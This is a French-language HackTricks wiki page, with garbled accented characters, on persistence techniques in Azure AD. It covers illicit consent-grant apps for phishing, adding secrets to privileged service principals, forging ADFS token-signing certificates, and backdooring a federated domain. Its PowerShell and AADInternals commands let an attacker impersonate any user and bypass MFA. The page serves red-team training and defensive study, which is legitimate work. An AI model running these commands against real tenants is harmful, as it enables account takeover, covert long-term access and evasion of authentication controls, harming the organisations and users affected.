# Az - Persistance

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

### Consentement illicite accord√©

Par d√©faut, tout utilisateur peut enregistrer une application dans Azure AD. Ainsi, vous pouvez enregistrer une application (uniquement pour le locataire cible) qui n√©cessite des autorisations √† fort impact avec le consentement de l'administrateur (l'approuver si vous √™tes l'administrateur) - comme envoyer des e-mails au nom d'un utilisateur, la gestion des r√¥les, etc. Cela nous permettra d'**ex√©cuter des attaques de phishing** qui seraient tr√®s **fructueuses** en cas de succ√®s.

De plus, vous pourriez √©galement accepter cette application avec votre utilisateur comme moyen de maintenir l'acc√®s.

### Applications et principaux de service

Avec les privil√®ges d'administrateur d'application, GA ou un r√¥le personnalis√© avec des autorisations de mise √† jour des informations d'identification microsoft.directory/applications/credentials, nous pouvons ajouter des informations d'identification (secret ou certificat) √† une application existante.

Il est possible de **cibler une application avec des autorisations √©lev√©es** ou **ajouter une nouvelle application** avec des autorisations √©lev√©es.

Un r√¥le int√©ressant √† ajouter √† l'application serait le **r√¥le d'administrateur d'authentification privil√©gi√©** car il permet de **r√©initialiser le mot de passe** des administrateurs globaux.

Cette technique permet √©galement de **contourner l'authentification multifactorielle**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Pour l'authentification bas√©e sur certificat

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### F√©d√©ration - Certificat de signature de jeton

Avec les **privil√®ges DA** sur AD local, il est possible de cr√©er et d'importer de **nouveaux certificats de signature de jeton** et de **d√©chiffrement de jeton** ayant une tr√®s longue validit√©. Cela nous permettra de **nous connecter en tant que n'importe quel utilisateur** dont nous connaissons l'ImuutableID.

**Ex√©cutez** la commande ci-dessous en tant que **DA sur le serveur ADFS** pour cr√©er de nouveaux certificats (mot de passe par d√©faut 'AADInternals'), les ajouter √† ADFS, d√©sactiver le renouvellement automatique et red√©marrer le service :
```powershell
New-AADIntADFSSelfSignedCertificates
```
Ensuite, mettez √† jour les informations du certificat avec Azure AD :
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### F√©d√©ration - Domaine de confiance

Avec les privil√®ges GA sur un locataire, il est possible d'**ajouter un nouveau domaine** (doit √™tre v√©rifi√©), de configurer son type d'authentification en F√©d√©r√© et de configurer le domaine pour **faire confiance √† un certificat sp√©cifique** (any.sts dans la commande ci-dessous) et √† l'√©metteur :
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## R√©f√©rences

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}
